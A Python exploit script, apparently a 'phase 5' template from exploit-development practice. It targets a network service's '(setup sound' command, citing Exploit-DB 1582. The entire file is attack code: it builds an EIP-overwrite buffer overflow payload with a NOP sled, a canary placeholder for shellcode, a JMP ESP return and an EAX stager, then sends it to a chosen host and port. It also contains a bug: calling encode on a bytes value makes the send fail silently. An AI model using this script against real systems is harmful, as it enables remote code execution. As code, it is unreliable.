#!/usr/bin/env python3
import socket, time, sys

# NOTE: This template used https://www.exploit-db.com/exploits/1582 as the example
# IMPORTANT: Dont forget to set up l_bytes

# Phase 5: Confirm the exploit strategy

# ------------------------------------------------------------------
# How do we confirm the exploit strategy?
# ------------------------------------------------------------------
# We slowly walk through each step:
# 1) Make EIP jump to stager (if used)
# 2) Verify stager contains either our canary or our instructions to get to the shellcode
# 3) Verify shellcode lands where we want

if len(sys.argv) != 5:
    print()
    print("Usage: {} <target ip> <target port> <offset of eip> <total size of payload>".format(sys.argv[0]))
    print("\tTarget IP: Remote hostname or IP address of target service")
    print("\tTarget Port: Remote port of target sevice")
    print("\tOffset of EIP: Offset of EIP from start of payload")
    print("\tTotal size of payload: Set to minimum if only confirming offset of EIP. Increase to test if bigger payload destabilizes control of EIP.")
    exit(0)

# sys.argv is the list of command line arguments
RHOST = 1
RPORT = 2
OFFSET_EIP = 3
TOTAL_PAYLOAD_SIZE = 4

l_rhost: str = sys.argv[RHOST]
l_rport: int = int(sys.argv[RPORT])
l_offset_eip: int = int(sys.argv[OFFSET_EIP])
l_total_payload_size: int = int(sys.argv[TOTAL_PAYLOAD_SIZE])

# Strategy:
# EAX points 12-bytes before buffer
# ESP points immediate after EIP at stager
# EIP contains JMP ESP (jump to stager)
# Stager contains Add EAX,12, JMP EAX (jump to noop sled before shellcode)
# noop sled is needed to give the shellcode some scratchpad memory to perform basic decoding of shellcode

# From /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
# add eax,12 --> 83C00C
# jmp eax --> FFE0
# jmp esp --> FFE4

# Temporary shellcode canary
# \x43\x41\x4E\x41\x52\x59 #CANARY

l_size_of_noop_sled: int = 16
l_noop_sled: bytes = bytes('\x90' * l_size_of_noop_sled, encoding='iso-8859-1')

l_shellcode: bytes = bytes('\x43\x41\x4E\x41\x52\x59', encoding='iso-8859-1')
l_size_of_shellcode: int = len(l_shellcode)

l_bytes_before_EIP: int = l_offset_eip - (l_size_of_noop_sled + l_size_of_shellcode)
l_filler_a = "A" * l_bytes_before_EIP

l_eip = bytes('\xFF\xE4', encoding='iso-8859-1') #jmp esp
l_size_of_EIP: int = len(l_eip)

l_stager = bytes('\x83\xC0\x0C\xFF\xE0', encoding='iso-8859-1') # add 12,eax; jmp eax
l_size_of_stager: int = len(l_stager)

l_bytes_after_EIP: int = l_total_payload_size - (l_offset_eip + l_size_of_EIP + l_size_of_stager)
l_filler_c: bytes = bytes('\x90' * l_bytes_after_EIP, encoding='iso-8859-1')

l_pattern = l_noop_sled + l_shellcode + l_filler_a.encode() + l_eip + l_stager + l_filler_c

try:
    # Create a TCP (socket)
    print("Connecting to {} port {}".format(l_rhost, l_rport))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((l_rhost, l_rport))
    print("Connected")
except:
    print("Could not connect to {} port {}".format(l_rhost, l_rport))
    exit(0)

try:
    # Send the message via the socket using the specific protocol
    print("Sending payload of length {}".format(len(l_pattern)))
    l_bytes = b'\x11' + '(setup sound '.encode() + l_pattern.encode() + b'\x90\x00' + '#'.encode()
    s.send(l_bytes)
    data = s.recv(1024)
    print("Data received: {}".format(data))
except:
    print("Could not send payload")

time.sleep(1)
s.close()
